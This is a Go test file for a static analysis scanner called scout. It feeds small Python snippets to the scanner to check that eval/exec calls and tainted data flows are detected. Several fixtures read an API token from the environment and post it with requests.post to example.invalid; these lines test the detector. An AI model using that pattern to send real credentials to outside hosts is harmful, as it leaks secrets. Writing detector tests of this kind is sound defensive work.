//go:build !coreonly && cgo

package scout_test

import (
	"context"
	"errors"
	"strings"
	"testing"

	"github.com/skarm/scout"
	"github.com/skarm/scout/internal/scantest"
	"github.com/skarm/scout/report"
)

// These tests MUST run with real embedded Tree-sitter in a full native build.
// Sources are scanner inputs only and are never imported or evaluated by Python.
func TestNativeDefinitionExpressionsReachPythonChecks(t *testing.T) {
	cfg := scantest.DefaultConfig()
	cfg.Scanner.Checks.Python = true
	s, e := scantest.New(cfg, t)
	if e != nil {
		t.Fatal(e)
	}
	for _, tc := range []struct{ name, text string }{
		{name: "arg-annotation", text: "def f(x: eval('inert')):\n    pass\n"},
		{name: "return-annotation", text: "def f() -> eval('inert'):\n    pass\n"},
		{name: "typed-default", text: "def f(x: str = eval('inert')):\n    pass\n"},
		{name: "vararg-annotation", text: "def f(*xs: eval('inert')):\n    pass\n"},
		{name: "kwarg-annotation", text: "def f(**xs: eval('inert')):\n    pass\n"},
		{name: "class-decorator", text: "@eval('inert')\nclass C:\n    pass\n"},
		{name: "class-keyword", text: "class C(metaclass=eval('inert')):\n    pass\n"},
		{name: "lambda-default", text: "f = lambda x=eval('inert'): x\n"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r, e := s.ScanBytes(context.Background(), "definition.py", []byte(tc.text))
			if e != nil && !errors.Is(e, scantest.ErrIncomplete) {
				t.Fatal(e)
			}
			found := false
			for _, f := range r.Findings {
				found = found || f.RuleID == "PY-AST2"
			}
			if !found {
				t.Fatalf("real parser lost definition expression: %+v", r.Coverage)
			}
		})
	}
}

func TestNativeAnnotationOnlyStatementsDoNotErasePythonFlows(t *testing.T) {
	cfg := scantest.DefaultConfig()
	cfg.Scanner.Checks.Python = true
	s, err := scantest.New(cfg, t)
	if err != nil {
		t.Fatal(err)
	}
	for _, tc := range []struct{ name, text, rule string }{
		{name: "callable", text: "run = eval\nrun: object\nrun(value)\n", rule: "PY-AST2"},
		{name: "environment", text: "import os, requests\ntoken = os.getenv('TOKEN')\ntoken: str\nrequests.post('https://example.invalid', data=token)\n", rule: "PY-TT3"},
		{name: "instance", text: "class Holder:\n    pass\nholder = Holder()\nholder.run = eval\nholder.run: object\nholder.run(value)\n", rule: "PY-AST2"},
		{name: "mapping", text: "actions = {'run': eval}\nactions['run']: object\nactions['run'](value)\n", rule: "PY-AST2"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			r, err := s.ScanBytes(t.Context(), "annotation.py", []byte(tc.text))
			if err != nil && !errors.Is(err, scantest.ErrIncomplete) {
				t.Fatal(err)
			}
			for _, finding := range r.Findings {
				if finding.RuleID == tc.rule {
					return
				}
			}
			t.Fatalf("annotation-only statement hid %s: %+v", tc.rule, r.Findings)
		})
	}
}

func TestPythonLocalDeclarationsDoNotBecomeBuiltinCalls(t *testing.T) {
	opts := scout.DefaultOptions()
	opts.Profile = scout.Custom
	opts.Checks = &scout.Checks{Python: true}
	scanner, err := scout.New(t.Context(), opts)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if err := scanner.Close(); err != nil {
			t.Error(err)
		}
	})
	for _, tc := range []struct {
		name, text string
		want       int
	}{
		{"starred module", "first, *exec = [1, 2]\nexec('text')\n", 0},
		{"starred function", "def f():\n    exec('text')\n    first, *exec = [1, 2]\n", 0},
		{"with target", "def f():\n    exec('text')\n    with context() as exec:\n        pass\n", 0},
		{"delete target", "def f():\n    exec('text')\n    del exec\n", 0},
		{"named expression", "def f():\n    exec('text')\n    (exec := lambda value: value)\n", 0},
		{"async with target", "async def f():\n    exec('text')\n    async with context() as exec:\n        pass\n", 0},
		{"nested with target", "def f():\n    exec('text')\n    with context() as (first, exec):\n        pass\n", 0},
		{"nested delete target", "def f():\n    exec('text')\n    del (first, exec)\n", 0},
		{"walrus condition", "def f():\n    exec('text')\n    if (exec := value):\n        pass\n", 0},
		{"walrus default", "def f():\n    exec('text')\n    def g(value=(exec := local)):\n        pass\n", 0},
		{"lambda default", "def f():\n    exec('text')\n    g = lambda value=(exec := local): value\n", 0},
		{"lambda scope isolation", "def f():\n    exec('text')\n    g = lambda: (exec := local)\n", 1},
		{"lambda local before binding", "f = lambda: (exec('text'), (exec := local))\n", 0},
		{"invoked lambda local before binding", "f = lambda: (exec('text'), (exec := local))\nf()\n", 0},
		{"comprehension walrus", "def f():\n    exec('text')\n    items = [(exec := local) for item in values]\n", 0},
		{"comprehension iteration isolation", "def f():\n    exec('text')\n    items = [exec for exec in values]\n", 1},
		{"with global declaration", "def f():\n    global exec\n    exec('text')\n    with context() as exec:\n        pass\n", 1},
		{"walrus nonlocal declaration", "def outer():\n    exec = local\n    def inner():\n        nonlocal exec\n        exec('text')\n        (exec := local)\n", 0},
		{"attribute does not bind", "def f():\n    exec('text')\n    with context() as obj.exec:\n        pass\n", 1},
		{"subscript does not bind", "def f():\n    exec('text')\n    del obj[exec]\n", 1},
		{"unpack never aliases scalar callable", "first, *call = [0, exec]\ncall('text')\n", 0},
		{"ordinary builtin", "exec('text')\n", 1},
		{"nested function isolation", "def f():\n    exec('text')\n    def g():\n        first, *exec = [1, 2]\n", 1},
		{"global declaration", "def f():\n    global exec\n    exec('text')\n    first, *exec = [1, 2]\n", 1},
	} {
		t.Run(tc.name, func(t *testing.T) {
			run, err := scanner.Scan(context.Background(), scout.Reader("probe.py", strings.NewReader(tc.text)))
			if err != nil && !errors.Is(err, scout.ErrIncomplete) {
				t.Fatal(err)
			}
			if strings.HasPrefix(tc.name, "starred") && !errors.Is(err, scout.ErrIncomplete) {
				t.Fatal("unmodeled starred unpacking lost its incomplete status")
			}
			if err := report.ValidateSealedRun(run); err != nil {
				t.Fatal(err)
			}
			if len(run.Targets) != 1 {
				t.Fatal("missing target")
			}
			count := 0
			for _, f := range run.Targets[0].Analysis.Findings {
				if f.RuleID == "PY-AST1" {
					count++
					start, end := f.Location.ByteStart, f.Location.ByteEnd
					if start < 0 || end > len(tc.text) || start >= end || tc.text[start:end] != "exec('text')" {
						t.Fatalf("finding lost its physical call span: %+v", f.Location)
					}
				}
			}
			if count != tc.want {
				t.Fatalf("PY-AST1=%d want=%d diagnostics=%+v", count, tc.want, run.Targets[0].Analysis.Diagnostics)
			}
		})
	}
}

func TestScannerPythonDictionaryKeyFlow(t *testing.T) {
	options := scout.DefaultOptions()
	options.Profile, options.Checks = scout.Custom, &scout.Checks{Python: true}
	scanner, err := scout.New(context.Background(), options)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if err := scanner.Close(); err != nil {
			t.Error(err)
		}
	})
	for _, tc := range []struct {
		name, body string
		want       int
	}{
		{name: "direct-key", body: `requests.post("https://example.invalid", json={os.getenv("API_TOKEN"): "public"})`, want: 1},
		{name: "assigned-key", body: "key = os.getenv(\"API_TOKEN\")\nbody = {key: \"public\"}\nrequests.post(\"https://example.invalid\", json=body)", want: 1},
		{name: "value-control", body: `requests.post("https://example.invalid", json={"public": os.getenv("API_TOKEN")})`, want: 1},
		{name: "literal-control", body: `requests.post("https://example.invalid", json={"key": "public"})`},
		{name: "overwrite-control", body: "body = {os.getenv(\"API_TOKEN\"): \"public\"}\nbody = {\"key\": \"public\"}\nrequests.post(\"https://example.invalid\", json=body)"},
	} {
		t.Run(tc.name, func(t *testing.T) {
			text := "import os, requests\n" + tc.body + "\n"
			run, err := scanner.Scan(context.Background(), scout.Reader("dictionary.py", strings.NewReader(text)))
			if err != nil && !errors.Is(err, scout.ErrIncomplete) {
				t.Fatal(err)
			}
			if err := report.ValidateSealedRun(run); err != nil {
				t.Fatal(err)
			}
			if len(run.Targets) != 1 {
				t.Fatalf("targets=%d", len(run.Targets))
			}
			count := 0
			for _, finding := range run.Targets[0].Analysis.Findings {
				if finding.RuleID == "PY-TT3" {
					count++
					if finding.Location.ByteStart < 0 || finding.Location.ByteEnd > len(text) || finding.Location.ByteStart >= finding.Location.ByteEnd {
						t.Fatalf("invalid source evidence: %+v", finding.Location)
					}
				}
			}
			if count != tc.want {
				t.Fatalf("PY-TT3=%d, want %d", count, tc.want)
			}
		})
	}
}

func TestScannerSuperLookupSkipsInstanceAttributes(t *testing.T) {
	options := scout.DefaultOptions()
	options.Profile, options.Checks = scout.Custom, &scout.Checks{Python: true}
	scanner, err := scout.New(context.Background(), options)
	if err != nil {
		t.Fatal(err)
	}
	t.Cleanup(func() {
		if err := scanner.Close(); err != nil {
			t.Error(err)
		}
	})
	for _, tc := range []struct {
		name, text  string
		calls, flow int
	}{
		{
			name: "explicit-super-safe-base",
			text: "class Base:\n    def run(self, data):\n        return data\nclass Child(Base):\n    pass\nobj = Child()\nobj.run = exec\nsuper(Child, obj).run(input())\n",
		},
		{
			name: "implicit-super-safe-base",
			text: "class Base:\n    def run(self, data):\n        return data\nclass Child(Base):\n    def invoke(self, data):\n        self.run = exec\n        super().run(data)\nChild().invoke(input())\n",
		},
		{
			name:  "ordinary-instance-override",
			text:  "class Base:\n    def run(self, data):\n        return data\nclass Child(Base):\n    pass\nobj = Child()\nobj.run = exec\nobj.run(input())\n",
			calls: 1, flow: 1,
		},
		{
			name:  "super-base-sink-remains-visible",
			text:  "class Base:\n    def run(self, data):\n        exec(data)\nclass Child(Base):\n    pass\nobj = Child()\nobj.run = lambda data: data\nsuper(Child, obj).run(input())\n",
			calls: 1, flow: 1,
		},
		{
			name:  "ordinary-safe-instance-override",
			text:  "class Base:\n    def run(self, data):\n        exec(data)\nclass Child(Base):\n    pass\nobj = Child()\nobj.run = lambda data: data\nobj.run(input())\n",
			calls: 1,
		},
	} {
		t.Run(tc.name, func(t *testing.T) {
			run, err := scanner.Scan(context.Background(), scout.Reader("super.py", strings.NewReader(tc.text)))
			if err != nil && !errors.Is(err, scout.ErrIncomplete) {
				t.Fatal(err)
			}
			if len(run.Targets) != 1 {
				t.Fatalf("targets=%d", len(run.Targets))
			}
			counts := map[string]int{}
			for _, finding := range run.Targets[0].Analysis.Findings {
				counts[finding.RuleID]++
				if finding.Location.ByteStart < 0 || finding.Location.ByteEnd > len(tc.text) || finding.Location.ByteStart >= finding.Location.ByteEnd {
					t.Fatalf("invalid source evidence: %+v", finding.Location)
				}
			}
			if counts["PY-AST1"] != tc.calls || counts["PY-TT5"] != tc.flow {
				t.Fatalf("counts=%v; want AST1=%d TT5=%d", counts, tc.calls, tc.flow)
			}
		})
	}
}
